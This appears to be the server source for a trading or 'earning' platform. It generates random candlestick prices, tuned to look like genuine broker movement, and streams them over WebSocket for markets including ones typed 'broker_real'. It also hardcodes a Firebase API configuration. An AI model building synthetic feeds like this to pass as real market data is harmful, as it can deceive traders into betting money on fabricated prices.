// --- START: server.js (v20 - Realistic Stutter & Pulse Movement) ---

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const firebase = require('firebase/app');
require('firebase/database');

// Firebase Configuration
const firebaseConfig = {
  apiKey: "AIzaSyBspVTNDTLn2zuwwI7580vqHABrAjJl63o",
  authDomain: "earning-xone-v1.firebaseapp.com",
  databaseURL: "https://earning-xone-v1-default-rtdb.firebaseio.com",
  projectId: "earning-xone-v1",
  storageBucket: "earning-xone-v1.appspot.com",
  messagingSenderId: "471994174185",
  appId: "1:471994174185:web:eb45e6c24a66b40c34fe78"
};

if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const app = express();
app.use(cors());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const MAX_CANDLES = 1000;
const TIMEFRAME = 60000;
const TICK_MS = 300; // ৩০০ms টিক রেট প্রফেশনাল ব্রোকারের জন্য পারফেক্ট
const MIN_PRICE = 0.00001;
const HISTORY_SEED_COUNT = 300;

const markets = {};
const adminOverrides = {};
const adminPatterns = {};

function roundPrice(v) {
  return parseFloat(Math.max(MIN_PRICE, v).toFixed(5));
}

function marketPathFromId(marketId) {
  return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase();
}

function cloneCandle(c) {
  return { timestamp: c.timestamp, open: c.open, high: c.high, low: c.low, close: c.close };
}

function generateHistoricalCandle(timestamp, open) {
  const safeOpen = Math.max(MIN_PRICE, open);
  const isGreen = Math.random() > 0.5;
  const body = (0.00006 + Math.random() * 0.00025) * safeOpen;
  const close = isGreen ? safeOpen + body : safeOpen - body;
  const upperWick = (0.00003 + Math.random() * 0.00015) * safeOpen;
  const lowerWick = (0.00003 + Math.random() * 0.00015) * safeOpen;

  return {
    timestamp,
    open: roundPrice(safeOpen),
    high: roundPrice(Math.max(safeOpen, close) + upperWick),
    low: roundPrice(Math.min(safeOpen, close) - lowerWick),
    close: roundPrice(close)
  };
}

async function initializeNewMarket(marketId, fbMarket = {}) {
  const path = marketPathFromId(marketId);
  let startPrice = 1.15;

  // Firebase থেকে আগের প্রাইস রিস্টোর
  try {
    const liveSnap = await db.ref(`markets/${path}/live`).once('value');
    const lastLive = liveSnap.val();
    if (lastLive && lastLive.price) startPrice = lastLive.price;
  } catch (e) {}

  const nowPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
  const candles = [];
  let currentPrice = startPrice;

  for (let i = HISTORY_SEED_COUNT; i > 0; i--) {
    const c = generateHistoricalCandle(nowPeriod - (i * TIMEFRAME), currentPrice);
    candles.push(c);
    currentPrice = c.close;
  }

  markets[marketId] = {
    marketId,
    marketPath: path,
    history: candles,
    currentPrice: currentPrice,
    lastMove: 0,
    targetPrice: currentPrice,
    stutterCount: 0
  };
}

function ensureCurrentPeriodCandle(marketData, currentPeriod) {
  let lastCandle = marketData.history[marketData.history.length - 1];
  if (!lastCandle) return null;

  if (currentPeriod > lastCandle.timestamp) {
    const newCandle = {
        timestamp: currentPeriod,
        open: lastCandle.close,
        high: lastCandle.close,
        low: lastCandle.close,
        close: lastCandle.close
    };
    marketData.history.push(newCandle);
    if (marketData.history.length > MAX_CANDLES) marketData.history.shift();
    return newCandle;
  }
  return lastCandle;
}

// 🔥 রিয়েলিস্টিক ক্যান্ডেল মুভমেন্ট (ধাক্কা খেয়ে এবং থেমে থেমে চলা)
function updateRealisticPrice(marketData, candle) {
  // ১. Stutter Logic (প্রাইস মাঝে মাঝে এক জায়গায় বেজে থাকবে)
  if (Math.random() < 0.35) return; 

  const openPrice = candle.open;
  const baseVolatility = openPrice * 0.00005;

  // ২. Impulse & Recoil (একদিকে লাফ দিয়ে আবার সামান্য ফিরে আসা)
  let impulse = (Math.random() - 0.5) * baseVolatility * 2.5;
  
  // গত মুভমেন্টের বিপরীত দিকে একটা টান রাখা (Spring effect)
  let recoil = -marketData.lastMove * 0.3; 
  
  // ৩. Micro Jitter (ছোট্ট কাঁপাকাপি)
  let jitter = (Math.random() - 0.5) * (baseVolatility * 0.2);

  let finalMove = impulse + recoil + jitter;
  
  // একদিকের টানের ভারসাম্য (Trend bias)
  if (Math.random() < 0.1) {
      finalMove *= 4; // হঠাৎ বড় ধাক্কা
  }

  marketData.currentPrice += finalMove;
  marketData.lastMove = finalMove; // পরবর্তী টিকে recoil এর জন্য সেভ রাখা

  // ৪. Boundary Check (ক্যান্ডেল যেন পাগলের মতো বড় না হয়)
  const dist = marketData.currentPrice - openPrice;
  if (Math.abs(dist) > openPrice * 0.001) {
      marketData.currentPrice -= finalMove * 1.5; // রিজেকশন
  }

  candle.close = roundPrice(marketData.currentPrice);
  candle.high = roundPrice(Math.max(candle.high, candle.close));
  candle.low = roundPrice(Math.min(candle.low, candle.close));
}

function broadcastCandle(marketId, candle) {
  const payload = JSON.stringify({ market: marketId, candle, serverTime: Date.now() });
  wss.clients.forEach((client) => {
    if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
      client.send(payload);
    }
  });
}

// Market লিসেনার
db.ref('admin/markets').on('value', (snapshot) => {
  const fbMarkets = snapshot.val() || {};
  Object.keys(fbMarkets).forEach((marketId) => {
    const type = fbMarkets[marketId]?.type;
    if ((type === 'otc' || type === 'broker_real') && !markets[marketId]) {
      initializeNewMarket(marketId, fbMarkets[marketId]);
    }
  });
});

wss.on('connection', (ws) => {
  ws.on('message', (raw) => {
    try {
      const msg = JSON.parse(raw.toString());
      if (msg?.type === 'subscribe') ws.subscribedMarket = msg.market;
    } catch (_) {}
  });
});

// 🔥 MAIN LOOP & BATCH SYNC (সার্ভার হ্যাং হবে না)
let lastSyncMinute = 0;

setInterval(() => {
  const now = Date.now();
  const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;
  const currentMinute = Math.floor(now / 60000);

  // ১. চার্ট মুভমেন্ট আপডেট
  for (const marketId in markets) {
    const marketData = markets[marketId];
    let candle = ensureCurrentPeriodCandle(marketData, currentPeriod);
    if (!candle) continue;

    updateRealisticPrice(marketData, candle);
    broadcastCandle(marketId, candle);
  }

  // ২. ফায়ারবেস ব্যাচ ব্যাকআপ (প্রতি মিনিটে ১ বার - ক্রন জব সেফটি)
  if (currentMinute > lastSyncMinute) {
    lastSyncMinute = currentMinute;
    const batchUpdates = {};
    for (const marketId in markets) {
      const m = markets[marketId];
      const lastC = m.history[m.history.length-1];
      if (lastC) {
        batchUpdates[`markets/${m.marketPath}/live`] = {
          price: lastC.close,
          timestamp: lastC.timestamp,
          marketId: marketId,
          updatedAt: now
        };
      }
    }
    db.ref().update(batchUpdates).catch(()=>{});
    console.log(`[Batch Sync] ${Object.keys(markets).length} markets backed up.`);
  }
}, TICK_MS);

app.get('/ping', (_req, res) => res.send('UltraSmooth V20 - Realistic Pulse Active'));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on ${PORT}`));

// --- END OF FILE ---